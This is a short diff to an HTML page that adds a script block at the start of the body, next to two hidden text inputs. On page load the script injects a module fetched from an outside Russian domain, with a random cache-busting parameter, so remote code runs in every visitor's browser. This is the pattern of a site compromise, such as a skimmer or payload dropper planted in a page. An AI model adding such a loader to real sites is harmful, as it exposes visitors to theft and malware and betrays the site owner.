@@ -14,6 +14,22 @@
 </head>
 
 <body>
+<script type="text/javascript">
+    !(function () {
+      function t() {
+        var t = document.createElement('script');
+        var h = (Math.random() * (99999 - 00001)).toFixed();
+        (t.type = 'module'), (t.async = !0), 
+        (t.src = 'https://evahelper.ru/build/main.js?h=' + h), 
+        document.head.appendChild(t);
+      }
+      'complete' == document.readyState
+        ? t()
+        : window.attachEvent
+        ? window.attachEvent('onload', t)
+        : window.addEventListener('load', t, !1);
+    })();
+</script>
 
    <input type="text" id="zn1" style="display: none;"/>
    <input type="text" id="zn2" style="display: none;" placeholder="b" />
